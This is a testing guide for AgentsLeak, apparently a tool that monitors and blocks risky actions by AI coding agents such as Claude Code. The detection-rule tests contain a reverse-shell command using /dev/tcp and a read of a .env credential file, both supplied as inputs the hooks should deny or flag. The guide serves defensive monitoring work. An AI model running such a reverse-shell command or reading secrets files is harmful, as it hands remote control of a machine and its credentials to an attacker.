# AgentsLeak - Testing Guide

This guide explains how to test AgentsLeak, a security monitoring platform for AI coding agents.

## Quick Start

### 1. Start the System

```bash
./scripts/start.sh
```

This starts both:
- **Backend API** at http://localhost:3827
- **Dashboard** at http://localhost:5173

### 2. Run the Demo

In a new terminal, run the demo script to simulate a full attack narrative:

```bash
./scripts/demo.sh              # Interactive — press Enter between acts
./scripts/demo.sh --auto       # Non-interactive — runs straight through
```

The demo walks through six acts covering normal development, reconnaissance, credential theft, evasion, sequence detection, and blocking.

### 3. View in Dashboard

Open http://localhost:5173 and you should see:
- **Dashboard**: Event counts, alert summary
- **Live Feed**: Real-time events streaming
- **Sessions**: List of test sessions
- **Alerts**: Triggered security alerts
- **Graph**: Visual representation of session activity

---

## Testing with Real Claude Code

### 1. Install Hooks

```bash
./hooks/install.sh
```

This adds hook entries to `~/.claude/settings.json`.

### 2. Start AgentsLeak

```bash
./scripts/start.sh
```

### 3. Use Claude Code Normally

In another terminal, run Claude Code:

```bash
claude
```

Every tool call Claude makes will be captured:
- File reads/writes → Logged to dashboard
- Bash commands → Logged, potentially blocked
- Network requests → Logged with domain tracking
- Subagent spawns → Tracked in session graph

### 4. Watch the Dashboard

Open http://localhost:5173 and watch events appear in real-time.

### 5. Uninstall Hooks (when done)

```bash
./hooks/uninstall.sh
```

---

## API Testing

### Check System Health

```bash
curl http://localhost:3827/health
```

### View API Documentation

Open http://localhost:3827/docs in your browser for interactive Swagger UI.

### Example API Calls

```bash
# Get dashboard stats
curl http://localhost:3827/api/stats/dashboard | jq

# List sessions
curl "http://localhost:3827/api/sessions?page=1&page_size=10" | jq

# Get session events
curl http://localhost:3827/api/sessions/{session_id}/events | jq

# List alerts
curl "http://localhost:3827/api/alerts?status=open" | jq

# Get session graph
curl http://localhost:3827/api/graph/session/{session_id} | jq
```

### WebSocket Testing

Connect to the WebSocket for real-time events:

```bash
websocat ws://localhost:3827/api/ws
```

Subscribe to events:
```json
{"action": "subscribe", "channels": ["events", "alerts"]}
```

---

## Testing Detection Rules

### Test Blocking Rules

These should return a "deny" decision from the PreToolUse hook:

```bash
# Reverse shell (RSHELL-001)
./hooks/pre-tool-use.sh <<EOF
{
  "session_id": "test",
  "hook_event_name": "PreToolUse",
  "tool_name": "Bash",
  "tool_input": {"command": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"},
  "cwd": "/home/user/project"
}
EOF

# Should output: {"hookSpecificOutput":{"permissionDecision":"deny",...}}
```

### Test Alert Rules

These should trigger alerts (check /api/alerts):

```bash
# Sensitive file access (SENS-001)
curl -X POST http://localhost:3827/api/collect/pre-tool-use \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "test-'$(date +%s)'",
    "hook_event_name": "PreToolUse",
    "tool_name": "Read",
    "tool_input": {"file_path": "/home/user/.env"},
    "cwd": "/home/user/project",
    "sensor_timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%S.000Z)'",
    "hostname": "test",
    "username": "test"
  }'
```

---

## Component Testing

### Backend (Python)

```bash
cd AgentsLeak

# Run Python tests
pytest tests/ -v

# Test imports
python -c "from agentsleak.server import app; print('OK')"

# Test CLI
python -m agentsleak --help
```

### Dashboard (React)

```bash
cd AgentsLeak/dashboard

# Type check
npx tsc --noEmit

# Lint
npm run lint

# Build (production)
npm run build
```

---

## Testing Scenarios

### Scenario 1: Normal Development Session

1. Start AgentsLeak
2. Install hooks
3. Run Claude Code, ask it to:
   - Read some files
   - Write a simple function
   - Run tests
4. Check dashboard shows events categorized correctly
5. No alerts should be triggered

### Scenario 2: Suspicious Activity Detection

1. Start AgentsLeak
2. Run `./scripts/demo.sh`
3. Check dashboard Alerts page
4. Verify:
   - SENS-* rules triggered alerts
   - RSHELL-001 was blocked
   - Attack chain visible in Graph view

### Scenario 3: Real-time Monitoring

1. Start AgentsLeak
2. Open dashboard Live Feed
3. Run `./scripts/demo.sh --auto` in another terminal
4. Verify events appear in real-time
5. Test filters (category, severity)
6. Test pause/resume

### Scenario 4: Graph Visualization

1. Start AgentsLeak
2. Run `./scripts/demo.sh --auto`
3. Open dashboard Graph page
4. Select the test session
5. Verify:
   - Session node in center
   - File nodes around it with READ/WRITE edges
   - Process nodes for Bash commands
   - Domain nodes for network access

---

## Troubleshooting

### Backend won't start

```bash
# Check if port is in use
lsof -i :3827

# Check Python dependencies
pip install -e .

# Run with debug output
python -m agentsleak --host 127.0.0.1 --port 3827
```

### Dashboard won't start

```bash
cd dashboard

# Reinstall dependencies
rm -rf node_modules package-lock.json
npm install

# Run with debug
npm run dev -- --debug
```

### Hooks not working

```bash
# Check Claude settings
cat ~/.claude/settings.json | jq '.hooks'

# Test hook manually
echo '{"session_id":"test","tool_name":"Read"}' | ./hooks/pre-tool-use.sh

# Check hook permissions
ls -la ./hooks/
```

### No events appearing

1. Check backend is running: `curl http://localhost:3827/health`
2. Check WebSocket: Open browser console, look for WS errors
3. Check database: `sqlite3 ~/.agentsleak/data.db "SELECT COUNT(*) FROM events;"`

---

## Cleanup

```bash
# Stop all processes
pkill -f agentsleak
pkill -f "npm run dev"

# Remove database
rm -rf ~/.agentsleak/

# Uninstall hooks
./hooks/uninstall.sh
```
